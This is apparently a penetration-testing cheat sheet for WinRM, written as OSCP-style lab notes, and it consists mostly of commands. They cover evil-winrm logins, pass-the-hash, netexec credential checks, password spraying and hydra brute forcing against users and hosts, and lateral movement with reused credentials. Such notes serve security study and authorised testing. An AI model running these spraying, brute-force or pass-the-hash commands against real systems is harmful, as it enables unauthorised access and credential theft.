# 5985/5986 - WinRM

## Service Usage

Connect
```bash
evil-winrm -i $ip -u $un -p $pw
evil-winrm -i $ip -u $un -H $ntlm_hash      # pass-the-hash
```
With TLS (5986)
```bash
evil-winrm -i $ip -u $un -p $pw -S
```

## 0. Fast Path (try these first)

netexec check — `(Pwn3d!)` in output = valid creds AND shell access:
```bash
nxc winrm $ip -u $un -p $pw
```
If admin creds → instant shell
```bash
evil-winrm -i $ip -u Administrator -p $pw
evil-winrm -i $ip -u Administrator -H $hash
```

## 1. Banner Grab & Unauthenticated Enumeration

Port + service confirm
```bash
nmap -p 5985,5986 -sV -sC $ip
```

## 2. Authenticated Enumeration

Auth check (cleanest signal)
```bash
nxc winrm $ip -u $un -p $pw
# Output: [+] DOMAIN\user:password (Pwn3d!)
```

Run a single command via WinRM (no full shell)
```bash
nxc winrm $ip -u $un -p $pw -x 'whoami'      # cmd
nxc winrm $ip -u $un -p $pw -X 'whoami'      # PowerShell
```

Shell + enumerate immediately
```bash
evil-winrm -i $ip -u $un -p $pw
whoami /priv
net user
net localgroup Administrators
```

### Upload/download inside evil-winrm
```bash
upload /local/file C:\path\
download C:\path\to\file /local/dest
```

## 3. Password Spraying / Bruteforcing

*Highly relevant — WinRM is one of the best spraying targets (fast, low-noise).*

Spray a known password across users
```bash
nxc winrm $ip -u users.txt -p 'Spring2026!' --continue-on-success
```

Spray across hosts with one admin cred
```bash
nxc winrm targets.txt -u Administrator -p 'Passw0rd!' --continue-on-success
```

Brute force
```bash
hydra -L users.txt -P pass.txt winrm://$ip
```

## 5. Quick Wins

### 5.1 Valid creds → immediate shell
```bash
evil-winrm -i $ip -u $un -p $pw
```

### 5.2 Pass-the-hash (if you have NTLM hash, no plaintext)
```bash
evil-winrm -i $ip -u $un -H $hash
```

### 5.3 Check auth without logging in (clean spray signal)
```bash
nxc winrm $ip -u $un -p $pw
```

### 5.4 Forced auth / delegation (rare on OSCP, note for AD)
```bash
# WinRM requires users in "Remote Management Users" or local admins
net localgroup "Remote Management Users"
```

## 6. Config Paths

WinRM service config
```text
winrm get winrm/config
winrm get winrm/config/service
```
Registry (override for port/auth)
```text
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WS-Management\Service
```

Config quick-reference:
```text
AllowUnencrypted -> if true, 5985 accepts plaintext (default)
Auth -> Basic/Kerberos/Negotiate flags
```

## 7. Post-Exploit / Pivot

- WinRM shell → PrivEsc (see Windows PrivEsc notes)
- Same creds → SMB/RDP notes for other boxes
- Pass-the-hash → lateral movement across the set

### Common gotchas
```text
- WinRM only works for admin / "Remote Management Users" members. Non-admin usually denied.
- 5985 = HTTP, 5986 = HTTPS. evil-winrm defaults to 5985.
- "The network path was not found" / connection refused = WinRM off, or firewall.
- Kerberos clock skew on AD sets — sync if SPN errors.
- If SMB (445) is closed, add -d DOMAIN to nxc to force WinRM-only auth (avoids SMB dependency).
```